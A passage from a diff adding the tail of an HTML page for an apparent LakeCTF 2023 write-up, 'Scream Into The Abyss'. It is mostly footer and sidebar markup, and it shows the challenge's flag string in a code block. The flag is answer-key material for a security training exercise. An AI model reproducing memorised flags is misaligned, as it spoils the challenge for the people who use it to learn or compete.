+EPFL{H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!}</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "LakeCTF 2023 - Scream Into The Abyss", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
